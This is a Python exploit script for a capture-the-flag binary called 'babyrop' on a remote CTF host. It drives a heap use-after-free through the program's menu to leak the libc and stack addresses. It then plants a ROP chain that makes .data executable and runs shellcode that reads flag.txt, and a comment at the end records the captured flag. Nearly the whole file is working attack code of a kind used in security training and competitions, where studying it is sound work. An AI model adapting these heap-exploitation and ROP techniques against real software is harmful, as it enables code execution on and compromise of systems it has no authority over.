#!/usr/bin/env python3
from sc_expwn import *  # https://raw.githubusercontent.com/shift-crops/sc_expwn/master/sc_expwn.py

bin_file = './babyrop'
context(os = 'linux', arch = 'amd64')
# context.log_level = 'debug'

#==========

env = Environment('debug', 'local', 'remote')
env.set_item('mode',    debug = 'DEBUG', local = 'PROC', remote = 'SOCKET')
env.set_item('target',  debug   = {'argv':'./ld-linux-x86-64.so.2 --library-path . {}'.format(bin_file).split(), 'aslr':False, 'gdbscript':''}, \
                        local   = {'argv':'./ld-linux-x86-64.so.2 --library-path . {}'.format(bin_file).split()}, \
                        remote  = {'host':'mc.ax', 'port':31245})
env.select()

#==========

binf = ELF(bin_file)
addr_got_puts       = binf.got['puts']
addr_got_free       = binf.got['free']
addr_data           = binf.sep_section['.data']

libc = ELF('libc.so.6')
offset_libc_puts    = libc.sep_function['puts']

#==========

def attack(conn, **kwargs):
    br = BabyROP(conn)

    br.create(0, 0x28, 'a'*8)
    br.create(1, 0x28, 'b'*8)
    br.free(0)
    br.free(1)

    br.create(1, 0x18, flat(8, addr_got_puts))
    addr_libc_puts = u64(br.read(0))
    libc.address = addr_libc_puts - offset_libc_puts
    info('addr_libc_base    = 0x{:08x}'.format(libc.address))
    addr_libc_environ   = libc.symbols['environ']

    br.write(1, flat(8, addr_libc_environ))
    addr_stack_environ = u64(br.read(0))
    info('addr_stack    = 0x{:08x}'.format(addr_stack_environ))

    rop = ROP(libc)
    rop.mprotect(addr_data, 0x1000, constants.PROT_READ|constants.PROT_WRITE|constants.PROT_EXEC)
    rop.read(constants.STDIN_FILENO, addr_data, 0x1000)
    rop.call(addr_data)

    exploit  = p64(rop.ret.address)*0x20
    exploit += bytes(rop)

    br.write(1, flat(len(exploit), addr_stack_environ - 0x200))
    br.write(0, exploit)

    shellasm  = shellcraft.open('flag.txt')
    shellasm += shellcraft.read('rax', addr_data+0x800, 0x800)
    shellasm += shellcraft.write('STDOUT_FILENO', addr_data+0x800, 'rax')
    shellasm += shellcraft.exit(0)
    shellcode = asm(shellasm)
    conn.sendline(shellcode)

class BabyROP:
    def __init__(self, conn):
        self.recv           = conn.recv
        self.recvuntil      = conn.recvuntil
        self.recvline       = conn.recvline
        self.unrecv         = conn.unrecv
        self.send           = conn.send
        self.sendline       = conn.sendline
        self.sendafter      = conn.sendafter
        self.sendlineafter  = conn.sendlineafter

    def create(self, idx, length, s):
        self.sendlineafter('command: ', b'C')
        self.sendlineafter('index: ', str(idx))
        self.sendlineafter(': ', str(length))
        self.sendafter(': ', s)

    def free(self, idx):
        self.sendlineafter('command: ', b'F')
        self.sendlineafter('index: ', str(idx))

    def read(self, idx):
        self.sendlineafter('command: ', b'R')
        self.sendlineafter('index: ', str(idx))
        self.recvuntil('bytes\n ')
        return bytes.fromhex(self.recvuntil('\n', drop=True).decode())

    def write(self, idx, s):
        self.sendlineafter('command: ', b'W')
        self.sendlineafter('index: ', str(idx))
        self.sendafter(': ', s)

    def exit(self):
        self.sendlineafter('command: ', b'E')
        self.sendlineafter('index: ', b'0')

#==========

def main():
    comn = Communicate(env.mode, **env.target)
    comn.connect()
    comn.run(attack)
    comn.interactive()
    # dice{glibc_2.34_stole_my_function_pointers-but_at_least_nobody_uses_intel_CET}

if __name__=='__main__':
    main()

#==========
